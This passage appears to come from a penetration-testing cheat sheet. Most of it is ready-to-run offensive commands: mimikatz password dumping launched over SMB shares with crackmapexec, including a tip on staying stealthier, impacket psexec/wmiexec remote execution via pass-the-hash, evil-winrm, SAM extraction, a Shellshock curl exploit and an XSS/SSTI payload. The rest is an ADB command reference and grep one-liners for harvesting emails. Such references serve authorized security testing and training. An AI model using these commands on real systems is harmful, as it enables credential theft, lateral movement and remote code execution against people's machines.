winexe -U admin%password //IP C:\\Windows\\mimikatz.exe
```
* Password dumping
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords /full
```
* In case of Mimikatz is trigerred on the target machine, you can try bring it up using network share
```
sudo python smbserver.py SHARE /home/xxxxx/share_path/
```
```
sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\\share_ip\SHARE\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords /full" exit > \\share_ip\SHARE\mimiout_$env:computername.txt'
```
* In order to be stealthier, you can even do the same for procdump
```
sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\\share_ip\SHARE\procdump.exe "TODO"'
```
------------------------
# impacket

#### [github link](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_24)

### psexec

* remote code execution 
```
python psexec.py domain/user:password@IP <command>
```
* Shell via pass-the-hash:
```
python psexec.py -hashes:<hash> <user_name>@<remote_hostname>
```
* Shell via pass-the-password:
```
python psexec.py Administrator:<password>4@<remote_hostname>
```
* Shell via no-pass
```
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
### smbexec

* remote code execution
```
python smbexec.py domain/user:password@IP <command>
```

### wmiexec

* remote code execution 
```
python wmiexec.py domain/user:password@IP <command>
```
### dcomexec

* remode code execution
```
python dcomexec.py domain/user:password@IP <command>
```

### crackmapexec
* over a subnet and extract SAM file:
```
python crackmapexec -u Administrator -H :011AD41795657A8ED80AB3FF6F078D03 <target_IP> --sam
```
### smbclient
Browse shares via pass-the-hash:
```
python smbclient.py <target_domain>/Administrator@target_IP -hashes 01[...]03:01[...]03
```
* a generic SMB client that will let you list shares and files, rename,
* upload and download files and create and delete directories

```
smbclient.py domain/user:password@IP
smbclient.py -dc-ip <attacker_IP> -target-ip <target_IP>> domain/user:password
```
--------------------------
## evil-wimrm

#### [github link](https://github.com/Hackplayers/evil-winrm)

install with gem `sudo gem install evil-winrm`

if you are using kali-linux; then it can be easily installed by `sudo apt install evil-winrm`

### Simple usage

* `connect` with the target
```
evil-winrm -i <target_IP> -u <user> -p <password>
```

* `download` & `upload` files

`upload`
```
upload local_filename (destination_filename)
```
`download`
```
download remote_filename (destination_filename)
```
--------------------------------------------------------------------------------------------------------
# Android


## ADB Basics

| COMMAND  | EXPLANATION |
-----------|-------------
| `adb devices` | lists connected devices
| `adb root` | restarts adb with root permissions
| `adb start-server` | starts the adb server
| `adb kill-server` | kills the adb server
| `adb reboot` | reboots the device
| `adb devices -l` | list of devices by product/model
| `adb shell` | starts the backround terminal
| `exit` | exits the background terminal
| `adb help` | list all commands
| `adb -s <deviceName> <command>` | redirect command to specific device
| `adb –d <command>` | directs command to only attached USB device
| `adb –e <command>` | directs command to only attached emulator |


 ### Package Installation
  
| COMMAND | EXPLANATION |
|---------|--------------
| `adb shell install <apk>` | install app
| `adb shell install <path>` | install app from phone path
| `adb shell install -r <path>` | install app from phone path
| `adb shell uninstall <name>` | remove the app


### File Operations

| LOCATOR | EXPLANATION |
|---------|-------------|
| `adb push <local> <remote>` | copy file/dir to device
| `adb pull <remote> <local>` | copy file/dir from device
| `run-as <package> cat <file>` | access the private package file


### Phone Info

| COMMAND | EXPLANATION |
|---------|--------------
| `adb get-statе` | print device state
| `adb get-serialno` | get the serial number
| `adb shell dumpsys iphonesybinfo` | get the IMEI
| `adb shell netstat` | list TCP connectivity
| `adb shell pwd` | print current working directory
| `adb shell dumpsys battery` | battery status
| `adb shell pm list features` | list phone features
| `adb shell service list` | list all services
| `adb shell dumpsys activity <package>/<activity>` | activity info
| `adb shell ps` | print process status
| `adb shell wm size` | displays the current screen resolution

  
### Paths
| COMMAND | EXPLANATION |
|---------|--------------
| `/data/data/<package>/databases` | app databases
| `/data/data/<package>/shared_prefs/` | shared preferences
| `/data/app` | apk installed by user
| `/system/app` | pre-installed APK files
| `/mmt/asec` | encrypted apps / App2SD
| `/mmt/emmc` | internal SD Card
| `/mmt/adcard` | external/Internal SD Card
| `/mmt/adcard/external_sd` | external SD Card

### Configure Settings Commands
| COMMAND | EXPLANATION |
|---------|-------------- 
| `adb shell dumpsys battery set level <n>` | change the level from 0 to 100
| `adb shell dumpsys battery set status <n>` | change the level to unknown,charging, discharging, not charging or full
| `adb shell dumpsys battery reset` | reset the battery
| `adb shell dumpsys battery set usb <n>` | change the status of USB connection ON or OFF
| `adb shell wm size WxH` | sets the resolution to WxH
  
### Table
| COMMAND | EXPLANATION |
|---------|--------------
| `adb shell list packages` | list package names
| `adb shell list packages -r` | list package name + path to apks
| `adb shell list packages -3` | list third party package names
| `adb shell list packages -s` | list only system packages
| `adb shell list packages -u` | list package names + uninstalled
| `adb shell dumpsys package packages` | list info on all apps
| `adb shell dump <name>` | list info on one package
| `adb shell path <package>` | path to the apk file

### Logs
| COMMAND | EXPLANATION |
|---------|--------------
| `adb logcat [options] [filter]` | view device log
| `adb bugreport` | print bug reports


### Permissions
| COMMAND | EXPLANATION|
|---------|-------------
| `adb shell permissions groups` | list permission groups definitions
| `adb shell list permissions -g -r` | list permissions details

### Device Related Commands
| COMMAND | EXPLANATION |
|---------|--------------|
| `adb reboot-recovery` | reboot device into recovery mode
| `adb reboot fastboot` | reboot device into recovery mode
| `adb shell screencap -p "/path/to/screenshot.png"` | capture screenshot
| `adb shell screenrecord "/path/to/record.mp4"` | record device screen
| `adb backup -apk -all -f backup.ab` | backup settings and apps
| `adb backup -apk -shared -all -f backup.ab` | backup settings, apps and shared storage
| `adb backup -apk -nosystem -all -f backup.ab` | backup only non-system apps
| `adb restore backup.ab` | restore a previous backup
| `adb shell am start -a android.intent.action.VIEW -d URL` | open URL
| `adb shell am start -t image/* -a android.intent.action.VIEW` | opens gallery

### Network
  
  | COMMAND | EXPLANATION |
  |---------|--------------|
  | `adb shell settings put global http_proxy 10.10.14.16:8080` |  Set a `proxy` to intercept requests |
  | `adb shell settings put global http_proxy :0` |  Remove `proxy`
---------------------------------------------------------------------------------------------------------
# Extra notes

### make NTML hash from password

```bash
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

### snap

```
sudo apt install snapd
```
```
service snapd start
```
```
sudo systemctl start snapd.service
```

### SMTP

* install `smtp` mail reader
```
sudo apt install evolution
```
### SQLi XSS SSTI
`one line payload`
```
<svg onload="prompt(5);">{{7*7}}</svg>
```

### ShellShock
`exploit by curl`
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/id' bash -s :'' http://10.10.10.56/cgi-bin/user.sh
```
### grep
#### emails

```
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' "$@" file.txt | sort | uniq > emails.txt
```
#### urls
```
cat file.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u
```

### Password List
 
#### Convert each password to base64
```
while read line; do echo -n -i $line | base64 >> base64-passwords.txt; done < passwords.txt
```
----------------------------------------------------------------------------------------------------------
